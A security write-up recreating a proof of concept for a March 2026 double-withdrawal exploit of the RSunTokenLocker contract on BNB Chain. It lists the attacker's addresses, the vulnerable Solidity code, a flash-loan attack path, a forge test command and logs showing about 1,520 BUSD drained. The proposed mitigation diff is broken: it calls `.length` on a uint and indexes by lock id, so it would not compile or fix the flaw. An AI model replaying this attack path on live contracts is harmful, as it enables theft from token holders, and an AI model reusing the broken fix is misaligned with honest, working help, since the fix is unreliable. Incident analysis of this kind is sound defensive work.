# 2026-03-Recreate-RSunTokenLocker-Exploit
Recreate a POC from RSunTokenLocker exploit that happen on 14 March 2026.

## KeyInfo

- Total Lost                        : ~1,521 USD

- Attacker                          : [0x30388EaCFe59F18E2D67a36a3a9064D7aAF702F0](https://bscscan.com/address/0x30388eacfe59f18e2d67a36a3a9064d7aaf702f0)

- Attack Contract                   : [0x64E41Afc877613E0c19d34FA494a9506C9e5a8C3](https://bscscan.com/address/0x64e41afc877613e0c19d34fa494a9506c9e5a8c3)

- Vulnerable Contract               :

- [RSunTokenLocker](https://bscscan.com/address/0xd26bF360DF43C0C60f5Db2800BeD3A79b348BDA0)

- Attack Tx                         : [Phalcon Attack Trace](https://app.blocksec.com/phalcon/explorer/tx/bsc/0x1d1cd964222d07f8d0e0a007b71cc42d4aaac66fa0ad9ded21b1d46b6b2d193c)


## Root Cause

- Vulnerability name            : Missing require to check `ownerToIndex` (double spend)

- Protocol affected             : [RSunTokenLocker](https://bscscan.com/address/0xd26bF360DF43C0C60f5Db2800BeD3A79b348BDA0)

- Root cause                    : No Require state and no state update after withdrawal

The contract does not check the `ownerToIndex` mapping, allowing the attacker to call `withdrawTokens()` on the same lock index multiple times sequentially and drain the same deposit repeatedly.

```javascript
function withdrawTokens(uint lockIndex) public {
        Lock memory lock = locks[lockIndex];
@>      require(lock.owner == msg.sender, "Only the owner can withdraw tokens");
        
        if (!lock.isVested) {
            require(block.timestamp >= lock.endTime, "Lock hasn't ended yet.");
        }

        uint timestampClamped = block.timestamp > lock.endTime ? lock.endTime : block.timestamp;
        uint amount = lock.isVested ? lock.amount * (timestampClamped - lock.lastWithdrawn) / lock.duration : lock.amount;

        if (lock.isVested && block.timestamp < lock.endTime) {
            locks[lockIndex].lastWithdrawn = uint48(block.timestamp);
        } else {
            removeLockOwnership(lockIndex);
        }

        require(IBEP20(lock.tokenAdr).transfer(msg.sender, amount), "Transfer failed");
        emit TokensUnlocked(lock.owner, uint112(amount));
    }
```

Although `ownerToIndex` already removed on the function above on `removeLockOwnership(lockIndex)`, function `withdrawTokens` does not check the updated mapping causing the attacker can do multiple withdrawal.

```javascript
    function removeLockOwnership(uint lockIndex) internal {
        uint[] memory lockIdsOwner = ownerToIndex[msg.sender]; //11

        uint index = ~uint(0);
        for (uint256 i = 0; i < lockIdsOwner.length; i++) {
            if (lockIdsOwner[i] == lockIndex) {
                index = i;
            }
        }

        if (index != ~uint(0)) {
            ownerToIndex[msg.sender][index] = lockIdsOwner[lockIdsOwner.length - 1];
@>          ownerToIndex[msg.sender].pop();
        }
    }
```

- Broken invariant              : user can do multiple withdrawal on a single lock

- Attack path (step-by-step)    : Flash loan BUSD from Cake-LP (PancakeSwap) -> `pancakeCall()` triggered -> Approve & `lockTokens(BUSD, amount, duration=0)` -> `withdrawTokens(lockIndex=11)` [1st withdraw] -> `withdrawTokens(lockIndex=11)` [2nd withdraw] -> Repay flash loan + keep profit

- Prevention / mitigation       : Add require check on the `ownerToIndex` on `withdrawTokens()`

```diff
function withdrawTokens(uint lockIndex) public {
        Lock memory lock = locks[lockIndex];
        require(lock.owner == msg.sender, "Only the owner can withdraw tokens");
+       require(ownerToIndex[msg.sender][lockIndex].length != 0);
        
        if (!lock.isVested) {
            require(block.timestamp >= lock.endTime, "Lock hasn't ended yet.");
        }

        uint timestampClamped = block.timestamp > lock.endTime ? lock.endTime : block.timestamp;
        uint amount = lock.isVested ? lock.amount * (timestampClamped - lock.lastWithdrawn) / lock.duration : lock.amount;

        if (lock.isVested && block.timestamp < lock.endTime) {
            locks[lockIndex].lastWithdrawn = uint48(block.timestamp);
        } else {
            removeLockOwnership(lockIndex);
        }

        require(IBEP20(lock.tokenAdr).transfer(msg.sender, amount), "Transfer failed");
        emit TokensUnlocked(lock.owner, uint112(amount));
    }
```


## Run the POC

To Run the POC please copy the `RisingSunToken_exploit.t.sol` file to your Foundry project `test` folder
Dont forget to change your RPC URl too

and then run it on terminal with this command
`forge test --mp test/2026-03/RisingSunToken/RisingSunToken_exploit.t.sol -vv`


```md
Ran 1 test for test/2026-03/RisingSunToken/RisingSunToken_exploit.t.sol:RisingSunTokenExploit
[PASS] test_RSunTokenLockerExploit() (gas: 289641)
Logs:
  ------------------------------------------------------------------------
  [START]  Attacker EOA BUSD Balances: 0.000000000000000000
  ------------------------------------------------------------------------
  |
  1. FlashSwap BUSD from Pancake 1525208669240080563214
  |
  2. Approve BUSD to RSunTokenLocker
  |
  3. Lock all BUSD to the Locker
  |
  4a. Withdraw two times, if we do three times, the balance of the Locker is not enough and will revert
  |
  4b. Current BUSD on this contract:  3050417338480161126428
  |
  5a. Repay the flashSwap to PancakSwap 1529798063430371678249
  |
  5b. Current BUSD on this contract after repay:  1520619275049789448179
  |
  6. Transfer all BUSD to the attacker 1520619275049789448179
  ------------------------------------------------------------------------
  [FINISH]  Attacker EOA BUSD Balances: 1520.619275049789448179
  ------------------------------------------------------------------------
  ```